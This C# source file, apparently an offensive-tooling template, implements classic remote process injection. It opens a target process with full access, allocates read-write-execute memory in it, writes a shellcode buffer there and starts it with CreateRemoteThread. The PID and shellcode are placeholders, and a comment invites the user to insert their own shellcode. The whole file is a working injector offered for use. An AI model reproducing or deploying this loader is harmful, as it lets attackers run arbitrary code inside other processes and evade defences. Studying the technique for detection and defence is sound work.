using System;
using System.Runtime.InteropServices;

namespace Classic_Injector
{
    internal class Program
    {
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, uint processId);

        [Flags]
        public enum ProcessAccessFlags : uint
        {
            All = 0x001F0FFF,
            Terminate = 0x00000001,
            CreateThread = 0x00000002,
            VirtualMemoryOperation = 0x00000008,
            VirtualMemoryRead = 0x00000010,
            VirtualMemoryWrite = 0x00000020,
            DuplicateHandle = 0x00000040,
            CreateProcess = 0x000000080,
            SetQuota = 0x00000100,
            SetInformation = 0x00000200,
            QueryInformation = 0x00000400,
            QueryLimitedInformation = 0x00001000,
            Synchronize = 0x00100000
        }

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [Flags]
        public enum AllocationType
        {
            Commit = 0x1000,
            Reserve = 0x2000,
            Decommit = 0x4000,
            Release = 0x8000,
            Reset = 0x80000,
            Physical = 0x400000,
            TopDown = 0x100000,
            WriteWatch = 0x200000,
            LargePages = 0x20000000
        }

        [Flags]
        public enum MemoryProtection
        {
            Execute = 0x10,
            ExecuteRead = 0x20,
            ExecuteReadWrite = 0x40,
            ExecuteWriteCopy = 0x80,
            NoAccess = 0x01,
            ReadOnly = 0x02,
            ReadWrite = 0x04,
            WriteCopy = 0x08,
            GuardModifierflag = 0x100,
            NoCacheModifierflag = 0x200,
            WriteCombineModifierflag = 0x400
        }

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll")]
        public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out IntPtr lpThreadId);

        [DllImport("kernel32.dll")]
        public static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

        static void Main(string[] args)
        {
            uint pid = 1337;                            // place for process id
            byte[] shellcode = new byte[1] { 0x00 };    // place for your shellcode
            bool inheritHandle = false;

            IntPtr processHandle = OpenProcess((uint)ProcessAccessFlags.All, inheritHandle, pid);
            Console.WriteLine("[+] Handle for process {0} - success", pid);

            int size = shellcode.Length;
            IntPtr addr = VirtualAllocEx(processHandle, IntPtr.Zero, (uint)(size + 2), (uint)AllocationType.Commit + (uint)AllocationType.Reserve, (uint)MemoryProtection.ExecuteReadWrite);
            Console.WriteLine("[+] Allocation memory in target process - success");

            WriteProcessMemory(processHandle, addr, shellcode, size, out IntPtr lpNumberOfBytesWritten);
            //Marshal.Copy(shellcode, 0, addr, size);
            Console.WriteLine("[+] Copying shellcode - success");

            IntPtr hThread = CreateRemoteThread(processHandle, IntPtr.Zero, 0, addr, IntPtr.Zero, 0, out hThread);
            Console.WriteLine("[+] Creating new thread - success");

            const UInt32 INFINITE = 0xFFFFFFFF;
            WaitForSingleObject(hThread, INFINITE);
            Console.WriteLine("[+] Done!");
        }
    }
}
